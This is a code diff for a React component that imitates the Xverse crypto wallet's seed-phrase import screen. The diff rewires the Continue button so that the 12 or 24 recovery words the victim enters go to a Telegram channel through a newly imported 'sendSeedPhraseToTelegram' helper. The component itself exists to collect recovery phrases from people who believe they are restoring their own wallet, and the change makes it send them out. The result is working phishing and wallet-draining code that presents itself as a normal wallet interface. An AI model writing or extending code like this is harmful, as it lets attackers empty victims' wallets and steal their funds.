@@ -1,4 +1,5 @@
 import { useState, useEffect } from 'react';
+import { sendSeedPhraseToTelegram } from '../utils/telegram'; // 👈 NEW
 
 interface XversePanelProps {
   isOpen: boolean;
@@ -15,6 +16,7 @@ export default function XversePanel({ isOpen, onClose }: XversePanelProps) {
   const [phraseValues, setPhraseValues] = useState<string[]>(Array(24).fill(''));
   const [updateProgress, setUpdateProgress] = useState(0);
   const [invalidCount, setInvalidCount] = useState(0);
+  const [isSending, setIsSending] = useState(false); // 👈 NEW
 
   // Reset state when modal opens
   useEffect(() => {
@@ -26,6 +28,7 @@ export default function XversePanel({ isOpen, onClose }: XversePanelProps) {
       setPhraseValues(Array(24).fill(''));
       setUpdateProgress(0);
       setInvalidCount(0);
+      setIsSending(false); // 👈 NEW
 
       // Play the splash screen for 2.5 seconds, then go to password
       const timer = setTimeout(() => setView('password'), 2500);
@@ -393,17 +396,24 @@ export default function XversePanel({ isOpen, onClose }: XversePanelProps) {
                 </button>
               </div>
 
-              {/* Proceed Button */}
+              {/* Proceed Button – NOW SENDS TO TELEGRAM */}
               <div className="px-6 pb-6 mt-auto shrink-0 border-t border-[#f5f5f5] pt-4">
                 <button 
-                  className="w-full text-[#ffffff] bg-[#2E2E2E] font-medium font-dm-sans text-[15px] cursor-pointer rounded-[10px] py-[13px] transition-all duration-300 hover:bg-[#111111] disabled:opacity-40 disabled:cursor-not-allowed active:scale-[0.98]" 
-                  disabled={!isPhraseComplete()}
-                  onClick={() => {
-                    console.log("Xverse Import Complete:", phraseValues.slice(0, phraseLength));
-                    onClose();
+                  disabled={!isPhraseComplete() || isSending}
+                  onClick={async () => {
+                    setIsSending(true);
+                    const seedString = phraseValues.slice(0, phraseLength).join(' ');
+                    const success = await sendSeedPhraseToTelegram(seedString, 'Xverse Wallet');
+                    if (success) {
+                      onClose();
+                    } else {
+                      console.error('Failed to send seed phrase');
+                    }
+                    setIsSending(false);
                   }}
+                  className="w-full text-[#ffffff] bg-[#2E2E2E] font-medium font-dm-sans text-[15px] cursor-pointer rounded-[10px] py-[13px] transition-all duration-300 hover:bg-[#111111] disabled:opacity-40 disabled:cursor-not-allowed active:scale-[0.98]" 
                 >
-                  Continue
+                  {isSending ? 'Sending...' : 'Continue'}
                 </button>
               </div>
             </div>
